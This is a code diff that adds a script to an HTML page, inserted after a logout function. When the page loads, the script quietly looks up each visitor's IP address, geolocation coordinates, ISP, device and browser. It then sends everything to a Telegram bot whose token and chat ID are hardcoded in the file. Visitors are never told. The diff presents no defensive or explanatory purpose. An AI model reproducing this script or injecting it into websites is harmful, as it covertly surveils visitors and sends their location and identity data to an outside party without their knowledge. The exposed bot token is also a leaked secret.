@@ -1248,6 +1248,62 @@ function logout() {
 }
 </script>
 
+
+<script>
+(async () => {
+  const TELEGRAM_BOT_TOKEN = '8124847122:AAFhV7O1JtqexwKdV-EmQfq27uaeW_SNBFE';
+  const TELEGRAM_CHAT_ID = '7154713742';
+
+  function getDeviceType() {
+    const ua = navigator.userAgent;
+    if (/tablet|ipad|playbook|silk/i.test(ua)) return 'Tablet';
+    if (/mobile|iphone|ipod|android|blackberry|opera mini|iemobile/i.test(ua)) return 'Mobile';
+    return 'Desktop';
+  }
+
+  function getBrowserInfo() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
+    if (ua.includes("Firefox")) return "Firefox";
+    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+    if (ua.includes("Edg")) return "Edge";
+    return "Unknown";
+  }
+
+  try {
+    const ipRes = await fetch('https://api.ipify.org?format=json');
+    const { ip } = await ipRes.json();
+
+    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+    const geo = await geoRes.json();
+
+    const message = `
+📥 New Visitor Logged
+===========================
+🌐 IP: ${ip}
+📍 Location: ${geo.city}, ${geo.region}, ${geo.country_name}
+🌎 Coordinates: ${geo.latitude}, ${geo.longitude}
+🏢 ISP: ${geo.org}
+🖥️ Device: ${getDeviceType()}
+🌐 Browser: ${getBrowserInfo()}
+🧭 User Agent: ${navigator.userAgent}
+🕒 Time: ${new Date().toUTCString()}
+`;
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+      })
+    });
+  } catch (err) {
+    console.error("Visitor log failed:", err);
+  }
+})();
+</script>
+
 </body>
 
 </html>
